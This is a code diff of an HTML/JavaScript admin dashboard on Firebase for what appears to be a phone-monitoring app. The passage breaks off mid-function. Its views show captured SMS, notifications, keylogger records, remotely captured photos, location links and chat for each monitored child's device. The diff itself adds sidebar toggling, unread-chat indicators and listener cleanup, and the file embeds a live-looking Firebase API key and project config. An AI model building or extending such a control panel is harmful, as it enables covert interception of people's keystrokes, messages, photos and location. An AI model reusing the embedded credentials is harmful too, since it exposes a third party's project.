@@ -31,6 +31,9 @@
             font-family: 'Inter', sans-serif;
             background: #0d1117;
             color: var(--text-primary);
+        }
+
+        body.modal-open {
             overflow: hidden;
         }
 
@@ -55,20 +58,38 @@
         .dashboard-container {
             display: flex;
             height: 100vh;
+            transition: all 0.4s ease-in-out;
         }
 
-        /* Sidebar Styles */
         .sidebar {
             width: 300px;
+            flex-shrink: 0; 
             background: var(--primary-dark);
             backdrop-filter: blur(10px);
             padding: 1.5rem;
             display: flex;
             flex-direction: column;
             border-right: 1px solid var(--border-color);
-            transition: transform 0.3s ease-in-out;
+            transition: transform 0.4s ease-in-out, width 0.4s ease-in-out, padding 0.4s ease-in-out;
             z-index: 1000;
+            overflow: hidden; 
         }
+
+        .dashboard-container.sidebar-hidden .sidebar {
+            width: 0;
+            padding: 1.5rem 0;
+        }
+
+        .sidebar > * {
+            transition: opacity 0.3s ease-in-out;
+            min-width: 252px;
+        }
+        
+        .dashboard-container.sidebar-hidden .sidebar > * {
+            opacity: 0;
+            visibility: hidden;
+        }
+
         .sidebar-header {
             margin-bottom: 2rem;
             display: flex;
@@ -85,32 +106,47 @@
             flex-grow: 1;
         }
         .user-list-item {
+            position: relative; 
             padding: 1rem;
             border-radius: 8px;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: all 0.3s;
             margin-bottom: 0.5rem;
             display: flex;
             align-items: center;
             gap: 15px;
+            border: 1px solid transparent;
         }
-        .user-list-item:hover, .user-list-item.active {
+        .user-list-item:hover {
+            background-color: rgba(88, 166, 255, 0.2);
+            border-color: rgba(88, 166, 255, 0.4);
+        }
+        .user-list-item.active {
             background-color: var(--accent-blue);
-            color: #fff;
+            color: #0d1117;
+            box-shadow: 0 4px 15px rgba(88, 166, 255, 0.25);
         }
+        .user-list-item.active .user-name,
+        .user-list-item.active .device-name,
+        .user-list-item.active .user-id {
+            color: #0d1117;
+            font-weight: 700;
+        }
+        .user-list-item.active svg {
+            stroke: #0d1117;
+        }
+
         .user-list-item .user-name { font-weight: 600; }
         .user-list-item .device-name { font-size: 0.8rem; opacity: 0.8; }
-        /* Updated User ID Style */
         .user-list-item .user-id { 
-            font-size: 0.85rem; /* Bada font size */
-            font-weight: 700;  /* Bold font */
+            font-size: 0.85rem;
+            font-weight: 700;
             color: var(--text-primary);
             opacity: 0.9;
             word-break: break-all; 
             margin-top: 6px;
         }
-
-        /* Main Content Styles */
+        
         .main-content {
             flex-grow: 1;
             padding: 2.5rem;
@@ -128,6 +164,34 @@
         .main-header h1 { font-size: 2.25rem; color: #fff; }
         .header-buttons { display: flex; gap: 1rem; align-items: center; }
         
+        .header-btn {
+            background: var(--secondary-dark);
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            cursor: pointer;
+            border-radius: 8px;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+        .header-btn:hover {
+            background: var(--accent-blue);
+            color: #fff;
+        }
+        .header-btn svg {
+            transition: transform 0.4s ease;
+        }
+        
+        #toggle-sidebar-btn { display: flex; }
+        #menu-btn { display: none; }
+        
+        .dashboard-container.sidebar-hidden #toggle-sidebar-btn svg {
+            transform: rotate(180deg);
+        }
+
         #send-notification-btn, #logout-btn {
             color: white;
             padding: 10px 15px;
@@ -148,6 +212,7 @@
             margin-bottom: 2rem;
         }
         .category-btn {
+            position: relative;
             background-color: var(--secondary-dark);
             border: 1px solid var(--border-color);
             color: var(--text-primary);
@@ -182,6 +247,28 @@
             stroke: #fff;
         }
         
+        .chat-notification-indicator, .sidebar-indicator {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: var(--accent-red);
+            border-radius: 50%;
+            border: 2px solid var(--bg-dark);
+            animation: blinker 1.5s linear infinite;
+        }
+        .chat-notification-indicator {
+            top: 12px;
+            right: 12px;
+        }
+        .sidebar-indicator {
+            top: 1rem;
+            right: 1rem;
+        }
+
+        @keyframes blinker {
+            50% { opacity: 0.2; }
+        }
+        
         .data-display-area {
             background: var(--primary-dark);
             padding: 2rem;
@@ -190,189 +277,39 @@
             min-height: 400px;
         }
         
-        .data-header {
-            display: flex;
-            justify-content: flex-end;
-            align-items: center;
-            margin-bottom: 1.5rem;
-            padding-bottom: 1rem;
-            border-bottom: 1px solid var(--border-color);
-            flex-wrap: wrap;
-            gap: 1rem;
-        }
-        .clear-category-btn, .capture-photo-btn, #refresh-photos-btn {
-            color: white;
-            padding: 8px 12px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 0.9rem;
-            font-weight: 500;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-        }
+        .data-header { display: flex; justify-content: flex-end; align-items: center; margin-bottom: 1.5rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border-color); flex-wrap: wrap; gap: 1rem; }
+        .clear-category-btn, .capture-photo-btn, #refresh-photos-btn { color: white; padding: 8px 12px; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; font-weight: 500; display: inline-flex; align-items: center; gap: 6px; }
         .clear-category-btn { background-color: var(--accent-red); }
         .capture-photo-btn { background-color: var(--accent-green); }
         #refresh-photos-btn { background-color: var(--accent-blue); }
-
         .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1.5rem; }
-        .photo-card {
-            background-color: var(--secondary-dark);
-            border-radius: 12px;
-            overflow: hidden;
-            border: 1px solid var(--border-color);
-        }
-        .photo-card img {
-            width: 100%;
-            height: 180px;
-            object-fit: cover;
-        }
-        .photo-info {
-            padding: 1rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .photo-time {
-            font-size: 0.8rem;
-            color: var(--text-secondary);
-        }
-        .view-btn {
-            background-color: var(--accent-blue);
-            color: white;
-            border: none;
-            border-radius: 6px;
-            width: 36px;
-            height: 36px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .map-link {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            margin-top: 1.5rem;
-            padding: 12px 20px;
-            background-color: var(--accent-blue);
-            color: #fff;
-            text-decoration: none;
-            border-radius: 8px;
-            font-weight: 600;
-            transition: background-color 0.3s;
-        }
-        .map-link:hover {
-            opacity: 0.9;
-        }
-
-        #login-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .login-card {
-            width: 100%;
-            max-width: 400px;
-            background: var(--primary-dark);
-            backdrop-filter: blur(10px);
-            padding: 2.5rem;
-            border-radius: 16px;
-            border: 1px solid var(--border-color);
-            text-align: center;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-        }
-        .login-card h2 { 
-            margin-bottom: 2rem;
-            color: #fff;
-            font-size: 1.8rem;
-        }
-        .login-card input {
-            background-color: var(--secondary-dark);
-            color: var(--text-primary);
-            border: 1px solid var(--border-color);
-            padding: 16px;
-            font-size: 1rem;
-            transition: border-color 0.3s;
-            width: 100%;
-            margin-bottom: 1rem;
-            border-radius: 8px;
-        }
-        .login-card input:focus {
-            outline: none;
-            border-color: var(--accent-blue);
-        }
-        .login-card button {
-             background: var(--accent-blue);
-             padding: 16px;
-             font-size: 1rem;
-             display: flex;
-             align-items: center;
-             justify-content: center;
-             gap: 10px;
-             transition: all 0.3s ease;
-             width: 100%;
-             margin-top: 10px;
-             border-radius: 8px;
-             border: none;
-             cursor: pointer;
-             color: white;
-             font-weight: 600;
-        }
-        .login-card button:hover {
-            box-shadow: 0 6px 20px rgba(58, 134, 255, 0.3);
-            transform: translateY(-2px);
-        }
-        #error-message { 
-            color: var(--accent-red); 
-            margin-top: 1rem; 
-            font-weight: 500; 
-            min-height: 20px;
-        }
-
-        .loader {
-            border: 4px solid var(--secondary-dark); border-top: 4px solid var(--accent-blue);
-            border-radius: 50%; width: 40px; height: 40px;
-            animation: spin 1s linear infinite; margin: 40px auto;
-        }
+        .photo-card { background-color: var(--secondary-dark); border-radius: 12px; overflow: hidden; border: 1px solid var(--border-color); }
+        .photo-card img { width: 100%; height: 180px; object-fit: cover; }
+        .photo-info { padding: 1rem; display: flex; justify-content: space-between; align-items: center; }
+        .photo-time { font-size: 0.8rem; color: var(--text-secondary); }
+        .view-btn { background-color: var(--accent-blue); color: white; border: none; border-radius: 6px; width: 36px; height: 36px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .map-link { display: inline-flex; align-items: center; gap: 8px; margin-top: 1.5rem; padding: 12px 20px; background-color: var(--accent-blue); color: #fff; text-decoration: none; border-radius: 8px; font-weight: 600; transition: background-color 0.3s; }
+        .map-link:hover { opacity: 0.9; }
+        #login-container { display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-card { width: 100%; max-width: 400px; background: var(--primary-dark); backdrop-filter: blur(10px); padding: 2.5rem; border-radius: 16px; border: 1px solid var(--border-color); text-align: center; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); }
+        .login-card h2 { margin-bottom: 2rem; color: #fff; font-size: 1.8rem; }
+        .login-card input { background-color: var(--secondary-dark); color: var(--text-primary); border: 1px solid var(--border-color); padding: 16px; font-size: 1rem; transition: border-color 0.3s; width: 100%; margin-bottom: 1rem; border-radius: 8px; }
+        .login-card input:focus { outline: none; border-color: var(--accent-blue); }
+        .login-card button { background: var(--accent-blue); padding: 16px; font-size: 1rem; display: flex; align-items: center; justify-content: center; gap: 10px; transition: all 0.3s ease; width: 100%; margin-top: 10px; border-radius: 8px; border: none; cursor: pointer; color: white; font-weight: 600; }
+        .login-card button:hover { box-shadow: 0 6px 20px rgba(58, 134, 255, 0.3); transform: translateY(-2px); }
+        #error-message { color: var(--accent-red); margin-top: 1rem; font-weight: 500; min-height: 20px; }
+        .loader { border: 4px solid var(--secondary-dark); border-top: 4px solid var(--accent-blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 40px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* --- NEW SMS Card View Styles --- */
-        .sms-card-list {
-            display: flex;
-            flex-direction: column;
-        }
-        .sms-card {
-            background-color: var(--secondary-dark);
-            border-radius: 12px;
-            padding: 1rem;
-            border-left: 4px solid var(--text-secondary);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-            margin-bottom: 1.5rem;
-        }
-        .sms-card:last-child {
-            margin-bottom: 0;
-        }
+        .sms-card-list { display: flex; flex-direction: column; }
+        .sms-card { background-color: var(--secondary-dark); border-radius: 12px; padding: 1rem; border-left: 4px solid var(--text-secondary); box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); margin-bottom: 1.5rem; }
+        .sms-card:last-child { margin-bottom: 0; }
         .sms-card.incoming { border-left-color: var(--accent-blue); }
         .sms-card.outgoing { border-left-color: var(--accent-green); }
         .sms-card-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 0.75rem; }
         .sms-card-icon svg { width: 24px; height: 24px; }
-        .sms-card-address {
-            font-weight: 600;
-            color: var(--text-primary);
-            word-wrap: break-word;
-        }
-        .sms-card-body {
-            line-height: 1.6;
-            color: var(--text-primary);
-            padding-left: 36px;
-            word-wrap: break-word;
-        }
+        .sms-card-address { font-weight: 600; color: var(--text-primary); word-wrap: break-word; }
+        .sms-card-body { line-height: 1.6; color: var(--text-primary); padding-left: 36px; word-wrap: break-word; }
         .sms-card-footer { text-align: right; font-size: 0.8rem; color: var(--text-secondary); margin-top: 0.75rem; }
-        
         .notification-list { display: flex; flex-direction: column; gap: 1rem; }
         .notification-card { background-color: var(--secondary-dark); padding: 1rem; border-radius: 8px; }
         .notification-header { display: flex; align-items: center; gap: 12px; margin-bottom: 0.75rem; }
@@ -381,8 +318,6 @@
         .notification-title { font-weight: 600; color: #fff; }
         .notification-body { font-size: 0.9rem; line-height: 1.5; color: var(--text-primary); }
         .notification-footer { font-size: 0.75rem; opacity: 0.6; text-align: right; margin-top: 0.75rem; }
-
-        /* NEW Keylogger Card Styles */
         .keylog-list { display: flex; flex-direction: column; gap: 1rem; }
         .keylog-card { background-color: var(--secondary-dark); padding: 1rem; border-radius: 8px; }
         .keylog-header { display: flex; align-items: center; gap: 12px; margin-bottom: 0.75rem; }
@@ -390,52 +325,15 @@
         .keylog-action { font-weight: 600; color: #fff; }
         .keylog-text { font-size: 0.95rem; line-height: 1.5; color: var(--text-primary); word-break: break-all; }
         .keylog-footer { font-size: 0.75rem; opacity: 0.6; text-align: right; margin-top: 0.75rem; }
-
-        .modal-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7); backdrop-filter: blur(5px);
-            display: none; justify-content: center; align-items: center;
-            z-index: 1001; padding: 20px; box-sizing: border-box;
-        }
-        .modal-content {
-            background: var(--primary-dark);
-            border: 1px solid var(--border-color);
-            padding: 1.5rem; border-radius: 12px;
-            width: 100%; max-width: 900px; box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-            display: flex; flex-direction: column; max-height: 90vh;
-        }
-        .modal-header {
-            display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border-color);
-        }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); display: none; justify-content: center; align-items: center; z-index: 1001; padding: 20px; box-sizing: border-box; }
+        .modal-content { background: var(--primary-dark); border: 1px solid var(--border-color); padding: 1.5rem; border-radius: 12px; width: 100%; max-width: 900px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); display: flex; flex-direction: column; max-height: 90vh; }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border-color); }
         .modal-header h3 { margin: 0; color: #fff; }
         .modal-body { overflow-y: auto; text-align: left; padding: 1rem 0; }
-        .modal-body textarea, .modal-body input {
-            width: 100%;
-            padding: 10px;
-            background-color: var(--secondary-dark);
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            color: var(--text-primary);
-            font-size: 1rem;
-            margin-bottom: 1rem;
-        }
-        .modal-footer {
-            margin-top: 1rem;
-            text-align: right;
-        }
-        .modal-footer button {
-            background-color: var(--accent-blue);
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: 600;
-        }
+        .modal-body textarea, .modal-body input { width: 100%; padding: 10px; background-color: var(--secondary-dark); border: 1px solid var(--border-color); border-radius: 6px; color: var(--text-primary); font-size: 1rem; margin-bottom: 1rem; }
+        .modal-footer { margin-top: 1rem; text-align: right; }
+        .modal-footer button { background-color: var(--accent-blue); color: white; padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; }
         .modal-close-btn { background: none; border: none; font-size: 24px; cursor: pointer; color: var(--text-primary); }
-
-        /* NEW Chat Styles */
         .live-chat-area { display: flex; flex-direction: column; height: 100%; }
         .chat-messages { flex-grow: 1; overflow-y: auto; padding: 1rem; display: flex; flex-direction: column-reverse; gap: 0.75rem; }
         .chat-bubble { padding: 10px 15px; border-radius: 18px; max-width: 75%; word-wrap: break-word; line-height: 1.4; }
@@ -447,15 +345,6 @@
         .chat-input-area input:focus { outline: none; border-color: var(--accent-blue); }
         .chat-input-area button { background-color: var(--accent-blue); border: none; border-radius: 8px; padding: 0 16px; cursor: pointer; color: white; }
 
-        #menu-btn {
-            display: none;
-            background: none;
-            border: none;
-            color: var(--text-primary);
-            cursor: pointer;
-            padding: 0;
-            margin: 0;
-        }
         #overlay {
             display: none;
             position: fixed;
@@ -466,6 +355,7 @@
             background-color: rgba(0,0,0,0.5);
             z-index: 999;
         }
+
         @media (max-width: 992px) {
             .sidebar {
                 position: fixed;
@@ -476,6 +366,9 @@
             }
             .sidebar.open {
                 transform: translateX(0);
+            }
+            #toggle-sidebar-btn { 
+                display: none;
             }
             #menu-btn {
                 display: block;
@@ -510,17 +403,23 @@
         <aside class="sidebar">
             <div class="sidebar-header">
                 <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
-                <h2>Users</h2>
+                <h2 id="sidebar-title">Users</h2>
             </div>
             <ul id="user-list" class="user-list"></ul>
         </aside>
 
         <main class="main-content">
             <header class="main-header">
-                <button id="menu-btn">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
-                </button>
-                <h1 id="main-content-title">Select a User</h1>
+                <div style="display: flex; align-items: center; gap: 1rem;">
+                    <button id="toggle-sidebar-btn" class="header-btn">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="9" y1="3" x2="9" y2="21"></line></svg>
+                    </button>
+                    <button id="menu-btn" class="header-btn">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+                    </button>
+                    <h1 id="main-content-title">Select a User</h1>
+                </div>
+
                 <div class="header-buttons">
                     <button id="send-notification-btn">Send Notification</button>
                     <button id="logout-btn">Logout</button>
@@ -563,17 +462,16 @@
         <div class="modal-content">
             <div class="modal-header">
                 <h3 id="modal-title">Data</h3>
-                <button id="modal-close-btn" class="modal-close-btn">×</button>
+                <button class="modal-close-btn">×</button>
             </div>
             <div class="modal-body" id="modal-data-display-area"></div>
         </div>
     </div>
-    
     <div id="notification-modal" class="modal-overlay">
         <div class="modal-content" style="max-width: 500px;">
             <div class="modal-header">
                 <h3 id="notification-modal-title">Send Notification to User</h3>
-                <button class="modal-close-btn" data-target="notification-modal">×</button>
+                <button class="modal-close-btn">×</button>
             </div>
             <div class="modal-body">
                 <textarea id="notification-message-input" rows="4" placeholder="Enter your message..."></textarea>
@@ -584,13 +482,13 @@
         </div>
     </div>
 
+
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
         import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-auth.js";
-        import { getDatabase, ref, onValue, remove, update, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
+        import { getDatabase, ref, onValue, remove, update, push, serverTimestamp, off } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
         import { getStorage, ref as storageRef, listAll, getDownloadURL, getMetadata, deleteObject } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-storage.js";
 
-        // Your NEW Firebase configuration
         const firebaseConfig = {
          apiKey: "AIzaSyBZ-E4_1bI4YN-1pt6xyMNXq1tOAvx0GY0",
          authDomain: "home-demo12-d5814.firebaseapp.com",
@@ -602,39 +500,81 @@
          measurementId: "G-NHHB06Z9HT"
         };
 
+
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
         const db = getDatabase(app);
         const storage = getStorage(app);
 
-        // --- Existing DOM Elements ---
+        // DOM Elements
         const loginContainer = document.getElementById('login-container');
         const dashboard = document.getElementById('dashboard');
         const userList = document.getElementById('user-list');
         const mainContentTitle = document.getElementById('main-content-title');
         const detailsView = document.getElementById('details-view');
         const categoryButtonsContainer = document.querySelector('.category-buttons');
-        const menuBtn = document.getElementById('menu-btn');
         const sidebar = document.querySelector('.sidebar');
         const overlay = document.getElementById('overlay');
         const dataModal = document.getElementById('data-modal');
-        const modalTitle = document.getElementById('modal-title');
         const modalDataDisplayArea = document.getElementById('modal-data-display-area');
-        const modalCloseBtn = document.getElementById('modal-close-btn');
-        
-        // --- NEW DOM Elements ---
-        const sendNotificationBtn = document.getElementById('send-notification-btn');
         const notificationModal = document.getElementById('notification-modal');
+        const sendNotificationBtn = document.getElementById('send-notification-btn');
         const sendNotificationSubmitBtn = document.getElementById('send-notification-submit-btn');
         const notificationMessageInput = document.getElementById('notification-message-input');
+        const menuBtn = document.getElementById('menu-btn');
+        const toggleSidebarBtn = document.getElementById('toggle-sidebar-btn');
+        const sidebarTitle = document.getElementById('sidebar-title');
 
-
+        // State
         let activeDataListener = null;
         let selectedUserInfo = {};
+        let activeChatListeners = []; 
 
-        // --- Existing Auth Logic ---
+        // --- Helper Functions ---
+        
+        // This function is for LOGOUT. It detaches ALL active listeners.
+        function detachAllListeners() {
+            if (activeDataListener) {
+                off(activeDataListener.ref, 'value', activeDataListener.callback);
+                activeDataListener = null;
+            }
+            activeChatListeners.forEach(listener => {
+                off(listener.ref, 'value', listener.callback);
+            });
+            activeChatListeners = [];
+        }
+        
+        // This function is ONLY for the sidebar chat indicators.
+        function detachChatIndicatorListeners() {
+            activeChatListeners.forEach(listener => {
+                off(listener.ref, 'value', listener.callback);
+            });
+            activeChatListeners = [];
+        }
+        
+        function openModal(modalElement) {
+            if (!modalElement) return;
+            modalElement.style.display = 'flex';
+            document.body.classList.add('modal-open');
+        }
+
+        function closeModal(modalElement) {
+            if (!modalElement) return;
+            // Detach the modal's specific listener when it's closed.
+            if (modalElement.id === 'data-modal' && activeDataListener) {
+                off(activeDataListener.ref, 'value', activeDataListener.callback);
+                activeDataListener = null;
+            }
+            modalElement.style.display = 'none';
+            document.body.classList.remove('modal-open');
+        }
+
+        // --- Auth & Main Listeners ---
         document.getElementById('login-btn').addEventListener('click', () => { signInWithEmailAndPassword(auth, document.getElementById('email').value, document.getElementById('password').value).catch(error => document.getElementById('error-message').textContent = "Login Failed. Ensure you are an admin."); });
-        document.getElementById('logout-btn').addEventListener('click', () => signOut(auth));
+        
+        document.getElementById('logout-btn').addEventListener('click', () => {
+            signOut(auth);
+        });
 
         onAuthStateChanged(auth, user => {
             if (user) {
@@ -643,7 +583,7 @@
                     if (snapshot.exists() && snapshot.val() === true) {
                         loginContainer.style.display = 'none';
                         dashboard.style.display = 'flex';
-                        loadUsersIntoSidebar();
+                        loadUsersAndSetupChatListeners();
                     } else {
                         signOut(auth);
                         alert("Access Denied. You are not an admin.");
@@ -652,51 +592,110 @@
             } else {
                 loginContainer.style.display = 'flex';
                 dashboard.style.display = 'none';
+                detachAllListeners(); // On logout, remove everything. This is correct.
             }
         });
         
-        function loadUsersIntoSidebar() {
+        // --- Core Application Logic ---
+        function loadUsersAndSetupChatListeners() {
             const usersRef = ref(db, 'user'); 
             onValue(usersRef, (snapshot) => {
+                // Only detach chat listeners. The modal's listener (activeDataListener) will NOT be touched.
+                detachChatIndicatorListeners();
+                
+                // Preserve the currently selected user's state
+                const activeListItem = document.querySelector('.user-list-item.active');
+                const activeUserId = activeListItem ? activeListItem.dataset.userid : null;
+                const activeChildKey = activeListItem ? activeListItem.dataset.childkey : null;
+
                 userList.innerHTML = '';
                 const data = snapshot.val();
+                let userCount = 0; // User counter
+
                 if (data) {
                     Object.keys(data).forEach(userId => {
-                        const userChildren = data[userId];
-                        Object.keys(userChildren).forEach(childKey => {
-                            const childData = userChildren[childKey];
+                        Object.keys(data[userId]).forEach(childKey => {
+                            userCount++; // Increment for each user entry
+                            const childData = data[userId][childKey];
                             const userName = childData?.data?.nameChild || childKey;
-                            const deviceName = childData?.data?.nameDevice || 'Unknown Device';
+                            
                             const listItem = document.createElement('li');
                             listItem.className = 'user-list-item';
                             listItem.dataset.userid = userId;
                             listItem.dataset.childkey = childKey;
-                            listItem.dataset.username = userName;
-                            listItem.dataset.devicename = deviceName;
-                            listItem.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg><div><div class="user-name">${userName}</div><div class="device-name">${deviceName}</div><div class="user-id">User: ${userId}</div></div>`;
+                            listItem.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg><div><div class="user-name">${userName}</div><div class="device-name">${childData?.data?.nameDevice || 'Unknown'}</div><div class="user-id">User: ${userId}</div></div>`;
+                            
+                            // Re-apply the active class to the selected user after refresh
+                            if (userId === activeUserId && childKey === activeChildKey) {
+                                listItem.classList.add('active');
+                            }
+
                             userList.appendChild(listItem);
+
+                            // Set up chat indicator listeners for the sidebar
+                            const chatRef = ref(db, `chats/${userId}/${childKey}/messages`);
+                            const chatCallback = (chatSnapshot) => {
+                                if (!chatSnapshot.exists()) return;
+
+                                const messages = chatSnapshot.val();
+                                let lastUserTimestamp = 0;
+                                let lastAdminTimestamp = 0;
+
+                                Object.values(messages).forEach(msg => {
+                                    if (msg.sender === 'user' && typeof msg.timestamp === 'number') {
+                                        lastUserTimestamp = Math.max(lastUserTimestamp, msg.timestamp);
+                                    } else if (msg.sender === 'admin' && typeof msg.timestamp === 'number') {
+                                        lastAdminTimestamp = Math.max(lastAdminTimestamp, msg.timestamp);
+                                    }
+                                });
+
+                                const indicator = listItem.querySelector('.sidebar-indicator');
+                                if (lastUserTimestamp > lastAdminTimestamp) {
+                                    if (!indicator) {
+                                        const newIndicator = document.createElement('div');
+                                        newIndicator.className = 'sidebar-indicator';
+                                        listItem.appendChild(newIndicator);
+                                    }
+                                } else {
+                                    if (indicator) indicator.remove();
+                                }
+                            };
+
+                            onValue(chatRef, chatCallback);
+                            activeChatListeners.push({ ref: chatRef, callback: chatCallback });
                         });
                     });
                 } else {
                     userList.innerHTML = '<li>No users found.</li>';
                 }
+                // Update the sidebar title with the count
+                sidebarTitle.textContent = `Users (${userCount})`;
             });
         }
         
-        // --- Existing Event Listeners with minor additions ---
         userList.addEventListener('click', (e) => {
             const listItem = e.target.closest('.user-list-item');
             if (listItem) {
                 document.querySelectorAll('.user-list-item.active').forEach(item => item.classList.remove('active'));
                 listItem.classList.add('active');
-                selectedUserInfo = { userId: listItem.dataset.userid, childKey: listItem.dataset.childkey, userName: listItem.dataset.username, deviceName: listItem.dataset.devicename };
-                mainContentTitle.textContent = `${selectedUserInfo.userName} (${selectedUserInfo.deviceName})`;
-                detailsView.style.display = 'block';
-                sendNotificationBtn.style.display = 'inline-flex'; // Show notification button
                 
-                document.querySelectorAll('.category-btn').forEach(btn => btn.classList.remove('active'));
-                if (dataModal.style.display === 'flex') {
-                    dataModal.style.display = 'none';
+                selectedUserInfo = { 
+                    userId: listItem.dataset.userid, 
+                    childKey: listItem.dataset.childkey, 
+                    userName: listItem.querySelector('.user-name').textContent 
+                };
+                mainContentTitle.textContent = selectedUserInfo.userName;
+                detailsView.style.display = 'block';
+                sendNotificationBtn.style.display = 'inline-flex'; 
+                
+                const mainChatButton = document.querySelector('.category-btn[data-category="chat"]');
+                const existingMainIndicator = mainChatButton.querySelector('.chat-notification-indicator');
+                if (existingMainIndicator) existingMainIndicator.remove();
+                
+                if (listItem.querySelector('.sidebar-indicator')) {
+                    const newMainIndicator = document.createElement('div');
+                    newMainIndicator.className = 'chat-notification-indicator';
+                    mainChatButton.appendChild(newMainIndicator);
                 }
 
                 if (window.innerWidth <= 992) {
@@ -709,62 +708,225 @@
         categoryButtonsContainer.addEventListener('click', (e) => {
             const button = e.target.closest('.category-btn');
             if (button) {
-                 document.querySelectorAll('.category-btn').forEach(btn => btn.classList.remove('active'));
-                 button.classList.add('active');
-                openDataModal(button.dataset.category);
+                openModal(dataModal);
+                displayCategoryData(button.dataset.category);
             }
         });
 
-        function openDataModal(category) {
-            modalTitle.textContent = `${category.charAt(0).toUpperCase() + category.slice(1)} Data`;
-            dataModal.style.display = 'flex';
-            displayCategoryData(category);
-        }
+        toggleSidebarBtn.addEventListener('click', () => dashboard.classList.toggle('sidebar-hidden'));
         
+        menuBtn.addEventListener('click', () => {
+            sidebar.classList.add('open');
+            overlay.style.display = 'block';
+        });
+
+        overlay.addEventListener('click', (e) => {
+            if(e.target === overlay) {
+                sidebar.classList.remove('open');
+                overlay.style.display = 'none';
+            }
+        });
+
+        document.querySelectorAll('.modal-close-btn').forEach(btn => {
+            btn.addEventListener('click', e => closeModal(e.target.closest('.modal-overlay')));
+        });
+        
+        document.querySelectorAll('.modal-overlay').forEach(modal => {
+            modal.addEventListener('click', e => {
+                if(e.target === modal) closeModal(modal);
+            });
+        });
+        
+        sendNotificationBtn.addEventListener('click', () => {
+            if (selectedUserInfo.userId) {
+                document.getElementById('notification-modal-title').textContent = `Send Notification to ${selectedUserInfo.userName}`;
+                notificationMessageInput.value = '';
+                openModal(notificationModal);
+            } else { alert('Please select a user first.'); }
+        });
+        
+        sendNotificationSubmitBtn.addEventListener('click', () => {
+            const message = notificationMessageInput.value.trim();
